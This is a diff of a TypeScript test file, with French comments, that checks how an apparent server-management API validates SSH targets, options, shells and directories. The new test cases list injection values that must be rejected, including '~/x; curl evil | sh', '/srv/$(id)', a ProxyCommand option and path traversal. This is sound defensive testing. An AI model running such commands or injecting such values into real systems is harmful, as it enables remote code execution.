@@ -57,16 +57,32 @@ test('nom obligatoire et unique sans casse, à la création comme au renommage',
   const r = await req('PATCH', `/api/servers/${a.id}`, { name: 'VPS-OVH' });
   expect(r.statusCode).toBe(200);
   expect(r.json<Server>().name).toBe('VPS-OVH');
+  // hors ASCII aussi (le lower() de SQLite ne le ferait pas)
+  expect((await req('POST', '/api/servers', { ...VPS, name: 'Évry' })).statusCode).toBe(201);
+  expect((await req('POST', '/api/servers', { ...VPS, name: 'évry' })).statusCode).toBe(409);
 });
 
 test('cible SSH : jamais une option déguisée ni un caractère de contrôle (D72)', async () => {
   t = await startTestDaemon();
-  for (const target of ['-oProxyCommand=touch /tmp/x', 'vps host', 'vps\nrm', '', 'a;b']) {
+  for (const target of [
+    '-oProxyCommand=touch /tmp/x',
+    '-v',
+    '-oFoo',
+    '-F',
+    'u@-host',
+    'vps:22',
+    'vps host',
+    'vps\nrm',
+    'vps\u0085',
+    'vps\u202e',
+    '',
+    'a;b',
+  ]) {
     const r = await req('POST', '/api/servers', { ...VPS, target });
     expect(r.statusCode, target).toBe(400);
   }
   expect(
-    (await req('POST', '/api/servers', { ...VPS, target: 'debian@vps.example:22' })).statusCode,
+    (await req('POST', '/api/servers', { ...VPS, target: 'debian@vps.example' })).statusCode,
   ).toBe(201);
   // en mode commande locale, la cible est une commande : espaces permis, contrôles refusés
   const cmd = await req('POST', '/api/servers', {
@@ -108,6 +124,26 @@ test('hôte SSH : options validées, ignorées hors de ce mode', async () => {
   expect((await bad({ user: '-l root' })).statusCode).toBe(400);
   expect((await bad({ jump: '-J x' })).statusCode).toBe(400);
   expect((await bad({ identityFile: '-i' })).statusCode).toBe(400);
+  // tiret en tête seul, sans espace ni `=` qui suffiraient déjà à refuser (review S.1)
+  expect((await bad({ user: '-v' })).statusCode).toBe(400);
+  expect((await bad({ jump: '-J' })).statusCode).toBe(400);
+  expect((await bad({ jump: 'u@-x' })).statusCode).toBe(400);
+  expect((await bad({ jump: 'debian@bastion:2222' })).statusCode).toBe(201);
+
+  // la forme exacte du type partagé, champs à null : jamais coercée en 0 ou ""
+  const nulls = await req('POST', '/api/servers', {
+    name: 'nulls',
+    mode: 'ssh_host',
+    target: 'h',
+    sshOptions: { port: null, user: null, identityFile: null, jump: null },
+  });
+  expect(nulls.statusCode).toBe(201);
+  expect(nulls.json<Server>().sshOptions).toEqual({
+    port: null,
+    user: null,
+    identityFile: null,
+    jump: null,
+  });
 
   const alias = await req('POST', '/api/servers', { ...VPS, sshOptions });
   expect(alias.json<Server>().sshOptions).toBeNull();
@@ -123,7 +159,7 @@ test('environnement, permissions et identité : validés, dossiers autorisés d�
     loadProfile: false,
     permissionMode: 'auto',
     confirmDestructive: false,
-    allowedDirs: ['~', '/srv', '/srv'],
+    allowedDirs: ['~', '/srv', '/srv/', '//srv'],
     groupName: 'Prod',
     color: '#a78bfa',
   });
@@ -147,6 +183,14 @@ test('environnement, permissions et identité : validés, dossiers autorisés d�
     { allowedDirs: ['srv'] },
     { shell: 'bash; rm' },
     { permissionMode: 'bypassPermissions' },
+    { workdir: '~/x; curl evil | sh' },
+    { workdir: '/srv/$(id)' },
+    { workdir: '/srv/../etc' },
+    { allowedDirs: ['/srv/a b'] },
+    { allowedDirs: ['~x'] },
+    { shell: '-c' },
+    { name: 'x'.repeat(65) },
+    { allowedDirs: Array.from({ length: 33 }, (_, i) => `/d${i}`) },
     { color: 'rouge' },
     { groupName: ' ' },
     { inconnu: 1 },
